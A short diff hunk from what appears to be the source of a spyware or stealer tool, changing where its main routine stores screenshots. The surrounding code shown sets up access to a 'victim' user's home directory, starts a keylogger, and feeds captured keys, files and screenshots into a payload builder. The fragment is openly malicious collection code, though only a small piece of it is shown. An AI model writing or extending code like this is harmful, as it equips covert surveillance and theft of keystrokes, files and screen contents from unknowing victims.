@@ -40,7 +40,7 @@ def _build_payload(keys: list[str], files: dict, screenshot_path: Path) -> dict:
 
 def main() -> None:
     home = Path(os.path.expanduser(f"~{sf.VICTIM_USERNAME}"))
-    screenshot_dir = Path("/tmp")
+    screenshot_dir = Path(sf.SCREENSHOT_DIR)
     screenshot_dir.mkdir(exist_ok=True)
 
     keylogger = collector.Keylogger()
